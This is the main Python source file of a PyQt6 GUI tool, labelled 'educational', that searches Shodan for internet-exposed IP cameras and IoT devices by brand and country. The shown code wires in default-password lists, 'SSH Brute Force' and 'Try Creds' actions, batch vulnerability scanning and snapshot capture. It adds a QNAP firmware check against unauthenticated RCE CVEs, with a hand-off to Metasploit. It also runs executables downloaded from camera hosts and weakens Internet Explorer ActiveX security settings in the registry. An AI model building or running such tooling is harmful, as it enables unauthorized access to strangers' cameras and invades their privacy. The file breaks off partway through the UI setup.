#!/usr/bin/env python3
"""
EDUCATIONAL Shodan Camera Analyzer - Classroom Edition (Modular)
All components loaded from modules/ folder.
Axis brand fully integrated with Quick Search (port, country, path).
"""

import sys
import os
import subprocess


def _bootstrap_dependencies():
    """Auto-install any missing pip requirements (first run on a new machine)."""
    import importlib.util as _ilu

    # (import name to probe, pip requirement spec)
    required = [
        ("shodan", "shodan>=1.30.0"),
        ("requests", "requests>=2.31.0"),
        ("pytz", "pytz>=2023.3"),
        ("PyQt6", "PyQt6>=6.6.0"),
        ("PyQt6.QtWebEngineWidgets", "PyQt6-WebEngine>=6.6.0"),
        ("colorama", "colorama>=0.4.6"),
        ("pyfiglet", "pyfiglet>=0.8.post1"),
    ]
    if sys.platform == "win32":
        required.append(("pythoncom", "pywin32>=306"))
        required.append(("comtypes", "comtypes>=1.2.0"))
    if sys.version_info < (3, 10):
        required.append(("importlib_metadata", "importlib-metadata>=6.0.0"))

    missing = []
    for import_name, pip_spec in required:
        if _ilu.find_spec(import_name) is None:
            missing.append(pip_spec)

    if not missing:
        return

    print(f"[SETUP] First-time setup: installing {len(missing)} missing package(s)...")
    for pkg in missing:
        print(f"    -> {pkg}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", *missing])
        print("[SETUP] Dependencies installed successfully.\n")
    except subprocess.CalledProcessError as exc:
        print(f"[SETUP] ERROR: automatic install failed ({exc}).")
        print("[SETUP] Please run manually: pip install -r requirements.txt")
        sys.exit(1)


_bootstrap_dependencies()

import json
import csv
import random
import pytz
import requests
import ipaddress
import time
import re
import pythoncom
import tempfile
import threading
import socket
import platform
from pathlib import Path
from datetime import datetime
import shutil
import importlib.util

from PyQt6.QtCore import QEvent
from PyQt6.QtGui import QImage
from PyQt6.QtWidgets import (
    QApplication,
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QSplitter,
    QTextEdit,
    QPushButton,
    QLineEdit,
    QLabel,
    QComboBox,
    QSpinBox,
    QCheckBox,
    QProgressBar,
    QTabWidget,
    QTableWidget,
    QTableWidgetItem,
    QListWidget,
    QListWidgetItem,
    QScrollArea,
    QSizePolicy,
    QStackedWidget,
    QHeaderView,
    QMessageBox,
    QFileDialog,
    QStatusBar,
    QGroupBox,
    QFormLayout,
    QFrame,
    QGridLayout,
    QMenu,
    QToolBar,
    QDialog,
    QDialogButtonBox,
    QInputDialog,
    QTreeWidget,
    QTreeWidgetItem,
)
from PyQt6.QtCore import (
    Qt,
    QThread,
    pyqtSignal,
    QTimer,
    QUrl,
    QSettings,
    QEventLoop,
    QMutex,
    QWaitCondition,
    pyqtSignal,
    QSize,
    QProcess,
)
from PyQt6.QtGui import (
    QIcon,
    QFontDatabase,
    QPixmap,
    QPainter,
    QPainterPath,
    QFont,
    QColor,
    QPalette,
    QDesktopServices,
    QKeySequence,
    QShortcut,
)
from PyQt6.QtMultimedia import QMediaPlayer, QAudioOutput, QAudioSource, QAudioFormat, QMediaDevices
from PyQt6.QtMultimediaWidgets import QVideoWidget
from functools import partial
from PyQt6.QtWebEngineWidgets import QWebEngineView
from colorama import init, Fore, Style
init(autoreset=True)
from modules.config import (API_KEY, PLUGIN_DIR, PLUGIN_URL, PLUGIN_EXE, PLUGIN_CLSID, PLUGIN_NAME,
                            SESSION_FILE, COMPLETION_SOUND, FLAG_EMOJI, COUNTRY_CODES,
                            YEAR_RANGE, DEFAULT_PASSWORDS, BRAND_DEFAULT_PASSWORDS, SSH_AVAILABLE, IE_AVAILABLE)
from modules.log_highlighter import LogHighlighter
from modules.avtech import avtech
from modules.workers import ScanWorker, IPScannerWorker, FastSshScanWorker, DirFuzzWorker, BatchVulnScanWorker
from modules.ssh_console import SshConsoleWidget
from modules.camera_vuln_scanner import CameraVulnScanner
from modules.dahua_scanner import DahuaScanner
from modules.dahua_pss_helper import (DahuaDeviceManager, load_devices_from_xml,
                                       get_device_capabilities, send_ptz_command,
                                       get_snapshot, DahuaAudioTalk)

# IE fallback (only used if IE_AVAILABLE)
if IE_AVAILABLE:
    import win32com.client
    import win32gui
    import win32con
    import win32api
    import win32process
    import comtypes
else:
    win32com = win32gui = win32con = win32api = win32process = comtypes = None


class MetasploitInstallWorker(QThread):
    """Downloads and launches the official Metasploit Framework installer for the
    detected OS, off the GUI thread so the overlay stays responsive. Source is
    Rapid7's official distribution:
      - Windows: https://windows.metasploit.com/metasploitframework-latest.msi
      - Linux/macOS: the rapid7/metasploit-omnibus msfinstall script (needs sudo).
    Emits progress/log/finished; it never installs silently - it kicks off the
    official installer (UAC/sudo prompt included) and reports back."""
    progress_signal = pyqtSignal(int, int)     # (downloaded_bytes, total_bytes)
    log_signal = pyqtSignal(str, str)          # (message, level)
    finished_signal = pyqtSignal(bool, str)    # (ok, message)

    WIN_MSI_URL = "https://windows.metasploit.com/metasploitframework-latest.msi"
    NIX_SCRIPT_URL = ("https://raw.githubusercontent.com/rapid7/metasploit-omnibus/"
                      "master/config/templates/metasploit-framework-wrappers/msfupdate.erb")

    def __init__(self, system, parent=None):
        super().__init__(parent)
        self.system = system

    def run(self):
        try:
            if self.system == "Windows":
                self._install_windows()
            else:
                self._install_unix()
        except Exception as e:
            self.log_signal.emit(f"Metasploit install failed: {e}", "error")
            self.finished_signal.emit(False, str(e))

    def _download(self, url, dest):
        self.log_signal.emit(f"Downloading Metasploit from {url}", "info")
        with requests.get(url, stream=True, timeout=60) as r:
            r.raise_for_status()
            total = int(r.headers.get("content-length", 0))
            done = 0
            with open(dest, "wb") as f:
                for chunk in r.iter_content(chunk_size=1 << 16):
                    if not chunk:
                        continue
                    f.write(chunk)
                    done += len(chunk)
                    self.progress_signal.emit(done, total)
        self.log_signal.emit(f"Downloaded installer to {dest}", "success")
        return dest

    def _install_windows(self):
        dest = os.path.join(tempfile.gettempdir(), "metasploit-latest.msi")
        self._download(self.WIN_MSI_URL, dest)
        self.log_signal.emit("Launching the Metasploit MSI installer (accept the UAC prompt)...", "info")
        # msiexec drives Rapid7's official GUI installer; Windows handles the
        # UAC elevation prompt itself.
        subprocess.Popen(["msiexec", "/i", dest])
        self.finished_signal.emit(
            True, "Windows installer launched - follow the Metasploit setup wizard, "
                  "then click 'Detect' here.")

    def _install_unix(self):
        dest = os.path.join(tempfile.gettempdir(), "msfinstall")
        self._download(self.NIX_SCRIPT_URL, dest)
        os.chmod(dest, 0o755)
        self.log_signal.emit("Launching msfinstall in a terminal (enter your sudo password there)...", "info")
        if self.system == "Darwin":
            # Terminal.app runs the installer so the user can type their sudo password.
            sh = os.path.join(tempfile.gettempdir(), "msf_install_run.command")
            with open(sh, "w") as f:
                f.write(f'#!/bin/bash\nsudo "{dest}"\necho "Done - press any key."; read -n1\n')
            os.chmod(sh, 0o755)
            subprocess.Popen(["open", "-a", "Terminal", sh])
        else:
            inner = f'sudo "{dest}"; echo "Done - press any key."; read -n1'
            launched = False
            for term in ("x-terminal-emulator", "gnome-terminal", "konsole",
                         "xfce4-terminal", "xterm"):
                path = shutil.which(term)
                if not path:
                    continue
                try:
                    if term in ("gnome-terminal", "xfce4-terminal"):
                        subprocess.Popen([path, "--", "bash", "-c", inner])
                    else:  # konsole/xterm/x-terminal-emulator share -e
                        subprocess.Popen([path, "-e", f"bash -c '{inner}'"])
                    launched = True
                    break
                except Exception:
                    continue
            if not launched:
                # No terminal emulator found - run directly (sudo may need a GUI askpass).
                subprocess.Popen(["bash", "-c", f'sudo "{dest}"'])
        self.finished_signal.emit(
            True, "msfinstall started - complete it in the terminal, then click 'Detect' here.")


class QnapCveWorker(QThread):
    """Non-destructively fingerprints a QNAP QTS NAS (model + firmware) and flags
    firmware in known-vulnerable ranges for the file-access CVEs. READ-ONLY: it
    only GETs public QTS info endpoints, it never authenticates or exploits - the
    actual access step is handed off to Metasploit on authorized targets."""
    result_signal = pyqtSignal(dict)
    log_signal = pyqtSignal(str, str)

    def __init__(self, ip, port, timeout=6, parent=None):
        super().__init__(parent)
        self.ip = ip
        self.port = port
        self.timeout = timeout

    def run(self):
        info = {"ip": self.ip, "port": self.port, "is_qnap": False,
                "model": "", "version": "", "cves": [], "notes": ""}
        base = f"http://{self.ip}:{self.port}"
        try:
            # QTS exposes model/firmware via authLogin.cgi as XML
            # (<modelName>/<version>/<build>) without authentication. Read-only.
            r = requests.get(base + "/cgi-bin/authLogin.cgi", timeout=self.timeout)
            body = r.text or ""
            if "QNAP" in body or "QDocRoot" in body or "modelName" in body:
                info["is_qnap"] = True
            m = re.search(r"<version>([\d.]+)</version>", body)
            if m:
                info["version"] = m.group(1)
            mm = re.search(r"<modelName>([^<]+)</modelName>", body)
            if mm:
                info["model"] = mm.group(1).strip()
            b = re.search(r"<build>(\d+)</build>", body)
            if b and info["version"]:
                info["version"] = f"{info['version']} build {b.group(1)}"
        except Exception as e:
            info["notes"] = f"authLogin.cgi probe failed: {str(e).split(':')[0]}"
        if not info["is_qnap"]:
            # Fallback: the QTS login page usually names QNAP/QTS in its HTML.
            try:
                r2 = requests.get(base, timeout=self.timeout)
                txt = r2.text or ""
                if "QNAP" in txt or "QTS" in txt:
                    info["is_qnap"] = True
                if not info["version"]:
                    vm = re.search(r"QTS\s*([\d.]+)", txt)
                    if vm:
                        info["version"] = vm.group(1)
            except Exception:
                pass
        info["cves"] = self._assess(info["version"])
        self.result_signal.emit(info)

    def _assess(self, version):
        """Coarse, clearly-labelled firmware check against the file-access CVEs.
        Build-exact matching is complex, so firmware in/below these ranges is
        flagged 'potentially vulnerable - verify', never asserted as exploitable."""
        cves = []
        m = re.match(r"(\d+)\.(\d+)\.(\d+)", version or "")
        if not m:
            return cves
        tup = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
        if tup <= (4, 3, 6):
            cves.append("CVE-2019-7194/7195 - unauth arbitrary file read/write "
                        "(Photo Station) - potentially vulnerable")
            cves.append("CVE-2019-7192 - unauth backup-config credential "
                        "disclosure - potentially vulnerable")
        if tup <= (4, 5, 1):
            cves.append("CVE-2020-2509 - unauth command injection / RCE - "
                        "potentially vulnerable")
        return cves


class EduCamAnalyzer(QMainWindow):
    pss_device_validated = pyqtSignal(object)
    # Generic "run this callable on the GUI thread" signal - used by
    # modules/dahua_integration.py's background scan threads. QTimer.singleShot
    # only fires if the calling thread has a running Qt event loop, which a
    # plain threading.Thread never has; a queued signal/slot connection is the
    # actual thread-safe way to marshal a call from a worker thread to the GUI.
    dahua_gui_call = pyqtSignal(object)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("IoT Camera Analyzer")
        icon_path = self.resource_path("Images/icon.ico")
        if Path(icon_path).exists():
            self.setWindowIcon(QIcon(icon_path))
        self.resize(1400, 900)

        self.settings = QSettings("NinjaLab", "EduCamAnalyzer")
        self.pss_device_validated.connect(self._apply_pss_device_validation)
        self.dahua_gui_call.connect(lambda fn: fn())
        self.plugins = {}
        self.results = []
        self.saved_favorites = []
        self.worker = None
        self.batch_vuln_worker = None
        self.ssh_worker = None
        # self.log() enqueues here instead of appending to the QTextEdit
        # directly - a timer (started in init_ui, once the log widgets exist)
        # flushes both queues in one batched append every ~150ms. Appending to
        # a QTextEdit is a relatively expensive layout/repaint operation, and a
        # busy scan can emit many log lines per second; batching keeps the GUI
        # responsive instead of doing one append per message.
        self._log_queue = []
        self._exploit_log_queue = []
        self.live_ssh_dlg = None
        self.live_table = None
        self.live_progress = None
        self.ip_country_cache = {}
        self.auto_refresh_timer = QTimer()
        self.auto_refresh_timer.timeout.connect(self.start_scan)
        self.ie = None
        self.ie_hwnd = None
        self.ie_frame = None
        self.web_view = None
        self.use_ie = IE_AVAILABLE

        self.current_index = {"all": -1, "good": -1, "bad": -1, "port22": -1, "fav": -1}
        # Port 22 (SSH) nmap-check tracking for the "Port 22 Open" tab.
        # port22_open_ips: hosts confirmed by nmap to have tcp/22 open.
        # _port22_checked: hosts already scanned/queued (dedupe so each Good IP
        # is only nmap-checked once). _port22_sem caps concurrent nmap procs.
        self.port22_open_ips = set()
        self._port22_checked = set()
        self._port22_sem = threading.Semaphore(10)
        self._batch_loading = False
        self._loading_history = False
        self._stop_background = False
        self._import_validation_thread = None

        self.timeout_spin = QSpinBox()
        self.delay_spin = QSpinBox()
        self.proxy_http = QLineEdit()
        self.proxy_socks = QLineEdit()
        self.auto_load_check = QCheckBox("Auto-Load Last Session")
        self.debug_check = QCheckBox("Enable Debug Mode")
        self.auto_cycle_check = QCheckBox("Auto‑load Good")
        self.current_theme = "default"
        self.completion_sound_path = COMPLETION_SOUND
        self.completion_sound_enabled = True

        self.init_ui()
        QShortcut(QKeySequence(Qt.Key.Key_Right), self, activated=self.show_next_result)
        QShortcut(QKeySequence(Qt.Key.Key_Left), self, activated=self.show_previous_result)
        QShortcut(QKeySequence(Qt.Key.Key_PageDown), self, activated=self.show_next_result)
        QShortcut(QKeySequence(Qt.Key.Key_PageUp), self, activated=self.show_next_result)

        self.load_settings()
        self.load_favorites()
        self.load_last_session()
        self.setup_browser()
        self.navigate_start_page()
        self.check_and_prompt_plugin()
        self.load_plugins()
        self.apply_theme()
        self.show_disclaimer()
        QTimer.singleShot(2000, self.auto_fix_ie_for_hikvision)

    def cleanup_on_crash(self, exc_type=None, exc_value=None, exc_traceback=None):
        try:
            if hasattr(self, 'auto_refresh_timer') and self.auto_refresh_timer.isActive():
                self.auto_refresh_timer.stop()
        except Exception:
            pass

        try:
            if hasattr(self, '_pss_live_timer') and self._pss_live_timer.isActive():
                self._pss_live_timer.stop()
        except Exception:
            pass

        self._stop_background = True

        try:
            for i in range(self.pss_feed_grid.count()):
                it = self.pss_feed_grid.itemAt(i)
                if not it:
                    continue
                w = it.widget()
                if not w:
                    continue
                if getattr(w, '_streaming', False):
                    self.stop_pss_live_stream(w)
        except Exception:
            pass

        try:
            if getattr(self, '_import_validation_thread', None) and self._import_validation_thread.is_alive():
                self._import_validation_thread = None
        except Exception:
            pass

    def resource_path(self, filename):
        if hasattr(sys, "_MEIPASS"):
            return os.path.join(sys._MEIPASS, filename)
        return os.path.join(os.path.abspath("."), filename)

    def _arrow_icon(self, direction):
        """Real PNG triangle icon (Images/icons/arrow_<direction>.png) for
        prev/next/PTZ/collapse controls - replaces the old unicode glyph
        arrows (◀▶▲▼) used as button text. Cached per direction."""
        cache = getattr(self, "_arrow_icon_cache", None)
        if cache is None:
            cache = self._arrow_icon_cache = {}
        if direction not in cache:
            cache[direction] = QIcon(self.resource_path(f"Images/icons/arrow_{direction}.png"))
        return cache[direction]

    def _update_motd_image(self):
        """Render the Message of the Day banner scaled to fit inside its label so
        the whole image is visible (contain fit, aspect ratio preserved), with
        rounded corners. No-op / keeps the text placeholder if the image failed
        to load."""
        if not hasattr(self, "_motd_pixmap") or self._motd_pixmap.isNull():
            return
        label = self.motd_label
        dpr = label.devicePixelRatioF()
        tw = max(1, int(label.width() * dpr))
        th = max(1, int(label.height() * dpr))
        # Scale the whole image to fit inside the label - all content stays
        # visible, no cropping (the label centres it in any leftover space).
        scaled = self._motd_pixmap.scaled(
            tw, th, Qt.AspectRatioMode.KeepAspectRatio,
            Qt.TransformationMode.SmoothTransformation)
        sw, sh = scaled.width(), scaled.height()
        # Round the corners so it sits neatly inside the group box.
        rounded = QPixmap(sw, sh)
        rounded.fill(Qt.GlobalColor.transparent)
        painter = QPainter(rounded)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing, True)
        radius = 8 * dpr
        path = QPainterPath()
        path.addRoundedRect(0.0, 0.0, float(sw), float(sh), radius, radius)
        painter.setClipPath(path)
        painter.drawPixmap(0, 0, scaled)
        painter.end()
        rounded.setDevicePixelRatio(dpr)
        label.setPixmap(rounded)

    def _motd_label_resize_event(self, event):
        """Keep the MOTD banner redrawn at the correct aspect ratio."""
        self._update_motd_image()
        return QLabel.resizeEvent(self.motd_label, event)

    # ------------------------------------------------------------------
    # Plugin & IE (unchanged)
    # ------------------------------------------------------------------
    def check_and_prompt_plugin(self):
        if self.use_ie and not PLUGIN_EXE.exists():
            reply = QMessageBox.question(
                self,
                "IE Plugin Required",
                "<h3>Internet Explorer Plugin Required</h3>"
                "<p>This tool needs the <b>IE Camera Plugin</b> to view legacy streams.</p>"
                "<p><b>Download and run it now?</b></p>",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply == QMessageBox.StandardButton.Yes:
                self.download_plugin()
            else:
                self.log("Plugin skipped. Some cameras may not display.", "warning")
        elif self.use_ie:
            self.log("IE Plugin EXE found.", "info")
            if not self.is_plugin_registered():
                reply = QMessageBox.question(
                    self,
                    "Run Plugin to Register",
                    "Plugin EXE found but not registered in IE. Run it now to enable?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                )
                if reply == QMessageBox.StandardButton.Yes:
                    self.run_plugin_exe()
        QTimer.singleShot(5000, self.ensure_webcomponents_installed)

    def download_plugin(self):
        try:
            self.log("Downloading IE plugin...", "info")
            r = requests.get(PLUGIN_URL, stream=True, timeout=30)
            r.raise_for_status()
            with open(PLUGIN_EXE, "wb") as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            self.log("Plugin downloaded.", "success")
            self.run_plugin_exe()
        except Exception as e:
            self.log(f"Plugin download failed: {e}", "error")

    def run_plugin_exe(self):
        try:
            subprocess.Popen([str(PLUGIN_EXE)], shell=True)
            self.log("IE Plugin EXE launched for registration.", "success")
            QTimer.singleShot(3000, self.restart_browser_with_plugin_check)
        except Exception as e:
            self.log(f"Failed to launch plugin EXE: {e}", "error")

    def is_plugin_registered(self):
        """Check whether the IE plugin is registered in the current user registry.

        Returns True if registered, False otherwise. Safe no-op when IE mode disabled.
        """
        if not self.use_ie:
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\Extensions")
            i = 0
            while True:
                try:
                    subkey = winreg.EnumKey(key, i)
                    if PLUGIN_NAME.lower() in subkey.lower():
                        return True
                    i += 1
                except OSError:
                    break
            # fallback: try to import typelib if provided
            if PLUGIN_CLSID != "{YOUR-PLUGIN-CLSID-HERE}":
                try:
                    comtypes.client.GetModule(PLUGIN_CLSID)
                    return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def ensure_webcomponents_installed(self):
        if not self.use_ie:
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            i = 0
            found = False
            while True:
                try:
                    subkey = winreg.EnumKey(key, i)
                    if "WebComponents" in subkey or "Hikvision" in subkey:
                        found = True
                        break
                    i += 1
                except OSError:
                    break
            if not found:
                self.log("Hikvision WebComponents not detected. Will auto-download on first camera load.", "warning")
        except Exception:
            pass

    def download_webcomponents(self, camera_url):
        if not self.use_ie:
            return
        try:
            possible_paths = ["/doc/WebComponents.exe", "/WebComponents.exe", "/download/WebComponents.exe"]
            exe_path = PLUGIN_DIR / "WebComponents.exe"
            for path in possible_paths:
                try:
                    url = camera_url.rstrip("/") + path
                    self.log(f"Trying WebComponents from {url}...", "info")
                    r = requests.get(url, timeout=30)
                    if r.status_code == 200 and "exe" in r.headers.get("content-type", ""):
                        with open(exe_path, "wb") as f:
                            f.write(r.content)
                        self.log("WebComponents downloaded. Installing...", "success")
                        subprocess.Popen([str(exe_path)], shell=True)
                        QTimer.singleShot(10000, self.restart_browser_with_plugin_check)
                        return
                except Exception:
                    continue
            self.log("WebComponents not found on camera.", "warning")
        except Exception as e:
            self.log(f"WebComponents download failed: {e}", "error")

    def restart_browser_with_plugin_check(self):
        self.setup_browser()
        self.log("Browser restarted with plugin checks.", "info")
        if self.use_ie and not self.is_plugin_registered():
            self.log("Plugin still not detected. Run EXE as admin or check IE add-ons.", "warning")

    def auto_fix_ie_for_hikvision(self):
        if not self.use_ie:
            self.log("IE not in use - skipping registry fixes.", "info")
            return
        self.log("Applying auto IE fixes for Hikvision...", "info")
        try:
            import winreg
            zones = [r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\local",
                     r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\intranet"]
            for zone in zones:
                try:
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, zone)
                    winreg.SetValueEx(key, "http", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                except: pass
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            activex_settings = {"1400":0, "1A00":0, "1001":0, "1004":0, "1200":0, "1405":0, "1806":0}
            for setting, value in activex_settings.items():
                winreg.SetValueEx(key, setting, 0, winreg.REG_DWORD, value)
            winreg.CloseKey(key)
            key_path = r"Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            exe_name = os.path.basename(sys.executable)
            winreg.SetValueEx(key, exe_name, 0, winreg.REG_DWORD, 11001)
            winreg.CloseKey(key)
            key_path = r"Software\Microsoft\Internet Explorer\GPU"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "SoftwareRendering", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            self.log("IE registry fixes applied successfully.", "success")
            self.restart_browser_with_plugin_check()
        except Exception as e:
            self.log(f"Auto-fix failed (run as Admin): {e}", "error")

    # ------------------------------------------------------------------
    # UI Setup
    # ------------------------------------------------------------------
    def init_ui(self):
        menubar = self.menuBar()
        file_menu = menubar.addMenu("&File")
        file_menu.addAction("Export CSV", self.export_csv)
        file_menu.addAction("Export HTML", self.export_html)
        file_menu.addSeparator()
        file_menu.addAction("Exit", self.close)

        view_menu = menubar.addMenu("&View")
        theme_menu = view_menu.addMenu("Theme")
        self.theme_default_action = theme_menu.addAction("Default (Neon Cyan)")
        self.theme_dark_action = theme_menu.addAction("Dark (Black & Grey)")
        self.theme_default_action.setCheckable(True)
        self.theme_dark_action.setCheckable(True)
        self.theme_default_action.triggered.connect(lambda: self.set_theme("default"))
        self.theme_dark_action.triggered.connect(lambda: self.set_theme("dark"))
        view_menu.addSeparator()
        view_menu.addAction("Reset Layout", self.reset_layout)
        if IE_AVAILABLE:
            view_menu.addAction("Switch to WebEngine Browser", self.switch_to_webengine)
            view_menu.addAction("Switch back to IE11", self.switch_to_ie)
            view_menu.addAction("Restart Internet Explorer Process", self.restart_ie_process)
        # keep the lightweight PSS preview dialog
        view_menu.addAction("PSS View", self.open_pss_view)
        # add a checkable PSS Mode which swaps the browser container into a SmartPSS-like view
        self.pss_mode_action = view_menu.addAction("PSS Mode")
        self.pss_mode_action.setCheckable(True)
        self.pss_mode_action.toggled.connect(self.toggle_pss_mode)
        # same pattern for the CVE/Exploit overlay - checkable, swaps the same
        # browser container, independent of Quick Search brand selection.
        self.vuln_overlay_action = view_menu.addAction("Metasploit Overlay")
        self.vuln_overlay_action.setCheckable(True)
        self.vuln_overlay_action.toggled.connect(self.toggle_vuln_overlay)

        links_menu = menubar.addMenu("&Links")
        links_menu.addAction("IP Chicken", lambda: self.open_link("https://ipchicken.com"))
        links_menu.addAction("Telegram (@NinjaScum)", lambda: self.open_link("https://t.me/NinjaScum"))
        links_menu.addAction("Website", lambda: self.open_link("http://ninjaman.atwebpages.com"))
        links_menu.addAction("TikTok", lambda: self.open_link("https://www.tiktok.com/@ytbigbossogaming"))
        links_menu.addAction("LALALA.ai", lambda: self.open_link("https://www.lalal.ai"))

        settings_menu = menubar.addMenu("&Settings")
        settings_menu.addAction("Preferences...", self.show_advanced_dialog)
        settings_menu.addAction("Manage Masscan...", self.show_masscan_dialog)
        settings_menu.addAction("Install Masscan", self.install_masscan)
        settings_menu.addSeparator()
        settings_menu.addAction("Reload Plugins", self.load_plugins)
        help_menu = menubar.addMenu("&Help")
        help_menu.addAction("About", self.show_about)
        help_menu.addAction("Ethical Guidelines", self.show_guidelines)
        help_menu.addAction("Fix Camera Display", self.troubleshoot_display)
        help_menu.addSeparator()
        help_menu.addAction("Developer Tools", self.show_dev_tools)

        toolbar = QToolBar()
        self.addToolBar(toolbar)
        toolbar.addAction("Start Scan", self.start_scan)
        toolbar.addAction("Pause", self.toggle_pause)
        toolbar.addAction("Stop", self.stop_scan)
        toolbar.addSeparator()
        toolbar.addWidget(QLabel("Auto-refresh:"))
        self.auto_spin = QSpinBox()
        self.auto_spin.setRange(0, 3600)
        self.auto_spin.setSuffix(" sec")
        toolbar.addWidget(self.auto_spin)
        self.auto_check = QCheckBox()
        toolbar.addWidget(self.auto_check)
        # (No separate QLabel here - the checkbox's own text is the label.)
        toolbar.addWidget(self.auto_cycle_check)
        toolbar.addSeparator()
        self.tz_button = QPushButton("Show All Time Zones")
        self.tz_button.setStyleSheet("QPushButton { background: #1e3a5f; color: #a8e6cf; border: 1px solid #00d4ff; padding: 6px 12px; border-radius: 6px; } QPushButton:hover { background: #2a5298; }")
        self.tz_button.clicked.connect(self.show_timezones_in_log)
        toolbar.addWidget(self.tz_button)
        self.reset_btn = QPushButton("Reset Cam")
        self.reset_btn.setStyleSheet(self.tz_button.styleSheet())
        self.reset_btn.clicked.connect(self.reset_cam)
        toolbar.addWidget(self.reset_btn)

        self.adv_button = QPushButton("Advanced")
        self.adv_button.setStyleSheet(self.tz_button.styleSheet())
        adv_menu = QMenu(self)
        adv_menu.addAction("Show Settings Dialog", self.show_advanced_dialog)
        self.adv_button.setMenu(adv_menu)
        toolbar.addWidget(self.adv_button)

        self.avtech_btn = QPushButton("AVTech Tester")
        self.avtech_btn.setStyleSheet(self.tz_button.styleSheet())
        self.avtech_btn.clicked.connect(self.open_avtech_tester)
        toolbar.addWidget(self.avtech_btn)

        self.ssh_button = QPushButton("SSH")
        self.ssh_button.setStyleSheet(self.tz_button.styleSheet())
        ssh_menu = QMenu(self)
        ssh_menu.addAction("SSH Connect", self.open_ssh_dialog)
        ssh_menu.addAction("Batch SSH Scan", self.start_batch_ssh_scan)
        ssh_menu.addAction("SSH Brute Force", self.open_ssh_brute_force)
        self.ssh_button.setMenu(ssh_menu)
        toolbar.addWidget(self.ssh_button)

        # Multi IoT mode - swaps the Quick Search box over to non-camera IoT
        # targeting (NAS/printer/router/... placeholders for now). Toggles on/off
        # and only touches the Quick Search box; everything else is untouched.
        self.multi_iot_btn = QPushButton("Multi IoT Mode")
        # Same dark-theme look as the other toolbar buttons, plus an explicit
        # :checked state so the ON state stays on-theme instead of falling back
        # to Qt's default (light) checked-button styling.
        self.multi_iot_btn.setStyleSheet(
            self.tz_button.styleSheet()
            + " QPushButton:checked { background: #0d2b45; color: #00d4ff;"
              " border: 1px solid #00d4ff; }"
            + " QPushButton:checked:hover { background: #14395e; color: #00d4ff; }")
        self.multi_iot_btn.setCheckable(True)
        self.multi_iot_btn.toggled.connect(self.toggle_multi_iot_mode)
        toolbar.addWidget(self.multi_iot_btn)

        # Dahua-specific quick actions (hidden unless Dahua mode selected)
        self.dahua_brute_btn = QPushButton("Dahua: Try Creds")
        self.dahua_brute_btn.setStyleSheet(self.tz_button.styleSheet())
        self.dahua_brute_btn.clicked.connect(lambda: self._wrapper_start_dahua_brute())
        self.dahua_brute_btn.hide()
        toolbar.addWidget(self.dahua_brute_btn)

        self.dahua_snap_btn = QPushButton("Dahua: Capture Snapshots")
        self.dahua_snap_btn.setStyleSheet(self.tz_button.styleSheet())
        self.dahua_snap_btn.clicked.connect(self.start_dahua_snapshots)
        self.dahua_snap_btn.hide()
        toolbar.addWidget(self.dahua_snap_btn)
        
        # Dahua Masscan and Export XML
        self.dahua_masscan_btn = QPushButton("Dahua: Scan")
        self.dahua_masscan_btn.setStyleSheet(self.tz_button.styleSheet())
        self.dahua_masscan_btn.clicked.connect(lambda: self._wrapper_start_dahua_masscan())
        self.dahua_masscan_btn.hide()
        toolbar.addWidget(self.dahua_masscan_btn)

        self.dahua_export_xml_btn = QPushButton("Dahua: Export PSS XML")
        self.dahua_export_xml_btn.setStyleSheet(self.tz_button.styleSheet())
        self.dahua_export_xml_btn.clicked.connect(lambda: self._wrapper_export_pss_xml())
        self.dahua_export_xml_btn.hide()
        toolbar.addWidget(self.dahua_export_xml_btn)

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)

        # Quick Search group
        basic_controls = QGroupBox("Quick Search")
        basic_form = QFormLayout()
        # Right-aligned labels next to their fields, with a bit more breathing
        # room between rows - a tidier, more classic dialog-form look.
        basic_form.setLabelAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
        basic_form.setFormAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft)
        basic_form.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)
        basic_form.setHorizontalSpacing(14)
        basic_form.setVerticalSpacing(9)
        basic_form.setContentsMargins(6, 12, 10, 8)
        self.brand_combo = QComboBox()
        self.brand_combo.addItems(["Hikvision", "Dahua", "Reecam", "AVTech", "Axis", "DVR LOGIN", "WIFICAM", "XiongMai", "Foscam", "D-Link", "Amcrest", "Tapo", "IP Scanner", "Custom Query"])
        self.brand_combo.currentTextChanged.connect(self.on_brand_changed)
        basic_form.addRow("Camera Brand:", self.brand_combo)
        self.country_combo = QComboBox()
        self.country_combo.addItems(COUNTRY_CODES.keys())
        basic_form.addRow("Country:", self.country_combo)
        self.year_row_label = QLabel("Year:")
        self.year_combo = QComboBox()
        self.year_combo.addItems([str(y) for y in YEAR_RANGE])
        self.year_combo.setCurrentText("2016")
        basic_form.addRow(self.year_row_label, self.year_combo)
        self.port_row_label = QLabel("Port:")
        self.port_spin = QSpinBox()
